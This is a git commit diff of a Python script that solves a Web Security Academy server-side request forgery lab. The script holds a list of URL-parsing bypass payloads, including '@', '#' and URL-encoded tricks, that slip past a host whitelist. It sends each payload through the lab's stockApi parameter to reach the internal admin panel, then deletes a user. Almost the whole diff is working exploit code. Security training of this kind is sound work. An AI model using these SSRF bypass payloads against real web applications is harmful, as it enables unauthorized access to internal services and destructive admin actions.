da6ce6539a6fc4ddde585c76eb6d8485d2f34d4e
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2021-10-25 21:30:48 -0400

    Update ssrf_whitelist.py

--- ssrf/ssrf_whitelist.py
+++ ssrf/ssrf_whitelist.py
@@ -3,22 +3,60 @@
 import requests
 import sys
 
-def connect(url, api, endpoint):
+# URL Encoded Special Char
+s_1 = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in "@")
+s_2 = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in "#")
+
+domains = [
+    # "http://domain@127.0.0.1",
+    # "http://127.0.0.1#domain",
+    # "http://domain.127.0.0.1",
+    # "http://127.0.0.1/domain",
+    # "http://127.0.0.1/?d=domain",
+    # "http://domain@localhost",
+    # "http://localhost#domain",
+    # "http://domain.localhost",
+    # "http://localhost/domain",
+    # "http://localhost/?d=domain",
+    # "http://127.0.0.1$00domain",
+    # "http://127.0.0.1///domain",
+    # "http://127.0.0.1?domain",
+    # "http://localhost$00domain",
+    # "http://localhost///domain",
+    # "http://localhost?domain",
+    # "http://localhost$domain",
+    "http://domain/127.0.0.1",
+    "http://localhost@domain",
+    f"http://localhost{s_1}domain",
+    f"http://localhost{s_2}@domain", # URL encoded "#" + @ worked
+]
+
+def ssrfToAdmin(url, api, endpoint):
+
+    for i in domains:
+        admin_url = i.replace("domain", "stock.weliketoshop.net")
+        payload = admin_url + "/" + endpoint
+
+        data = {
+            "stockApi" : payload,
+        }
+
+        r = requests.post(url + api, data=data)
+
+        if r.status_code == 200:
+            print("[INFO] SSRF successful admin page granted!")
+            print(f"[INFO] Payload: {payload}")
+        else:
+            pass
+
+    return payload
+
+def deleteUser(url, api, payload):
+
+    username = "carlos"
 
     data = {
-        "test" : "test",
-    }
-
-    r = requests.post(url + api, data = data)
-
-    return
-
-def deleteUser(url, api, backend_IP, backend_PORT, admin_range):
-
-    username = "wiener"
-
-    data = {
-        "stockApi" : f"http://{backend_IP}{admin_range}:{backend_PORT}/admin/delete?username={username}"
+        "stockApi" : f"{payload}/delete?username={username}"
     }
 
     r = requests.post(url + api, data = data)
@@ -31,8 +69,9 @@ def deleteUser(url, api, backend_IP, backend_PORT, admin_range):
 
 
 if __name__ == '__main__':
-    url = "https://ac0c1f501fb50951c0f8412c002900df.web-security-academy.net"
+    url = "https://ac3f1fb71eb5f9b2c0264e25002f0089.web-security-academy.net"
     api = "/product/stock"
     endpoint = "admin"
 
-    connect(url, api)
+    payload = ssrfToAdmin(url, api, endpoint)
+    deleteUser(url, api, payload)
